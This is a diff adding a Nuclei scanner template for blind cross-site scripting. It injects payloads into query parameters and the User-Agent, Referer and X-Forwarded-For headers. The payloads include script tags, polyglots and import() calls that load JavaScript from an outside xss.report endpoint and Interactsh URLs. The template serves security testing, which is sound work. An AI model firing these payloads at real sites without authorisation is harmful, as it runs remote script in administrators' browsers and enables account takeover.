@@ -1,0 +1,73 @@
+id: blind-xss-enhanced-pro
+
+info:
+  name: Blind XSS Pro (Headers & Query)
+  author: ajvad
+  severity: critical
+  description: |
+    Detects Blind XSS via OOB interactions (Interactsh & xss.report) in Query Parameters and HTTP Headers.
+    Targeting Headers is crucial for finding Blind XSS in logging systems and admin panels.
+  reference:
+    - https://github.com/projectdiscovery/nuclei-templates
+    - https://xss.report
+  tags: xss,blind,oob,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      # Inject into headers that are commonly logged/displayed in Admin Panels
+      User-Agent: "{{blind}}"
+      Referer: "{{blind}}"
+      X-Forwarded-For: "{{blind}}"
+
+    payloads:
+      blind:
+        # --- Custom XSS Report ---
+        - '"><script src=https://xss.report/c/ajvadn></script>'
+        - "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://xss.report/c/ajvadn\\';document.body.appendChild(a)')"
+        
+        # --- Interactsh (True Blind) ---
+        - '"><script src=//{{interactsh-url}}></script>'
+        - '"><img src=x onerror=import("//{{interactsh-url}}")>'
+        - '"><svg/onload=import("//{{interactsh-url}}")>'
+        
+        # --- Polyglots (Context Breakers) ---
+        - 'javascript:"/*\"/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/onload=import("//{{interactsh-url}}")&gt;*/'
+        - '"><iframe/src="javascript:import(`//{{interactsh-url}}`)">'
+        - "';import('//{{interactsh-url}}');"
+
+    fuzzing:
+      # Fuzz Query Parameters
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{blind}}"
+
+      # Note: The 'headers' section above automatically injects into those specific headers.
+      # We don't need a separate fuzzing rule for them if we define them with the payload variable directly in the request.
+      # However, defining them in 'headers' sends the payload in EVERY request, which is efficient for header checks.
+
+    stop-at-first-match: false
+
+    matchers-condition: or
+    matchers:
+      # Matcher 1: OOB Interaction (Primary Goal)
+      - type: word
+        part: interactsh_protocol
+        name: oob-confirmation
+        words:
+          - "http"
+          - "dns"
+
+      # Matcher 2: Strict Reflected Check (Bonus)
+      - type: dsl
+        name: reflected-confirmation
+        dsl:
+          - "contains(header, 'text/html')"
+          - "(contains(body, '<script src=https://xss.report/c/ajvadn></script>') || contains(body, '{{interactsh-url}}'))"
+          - "(contains(body, '<script') || contains(body, 'onerror=') || contains(body, 'onload=') || contains(body, 'import('))"
+        condition: and
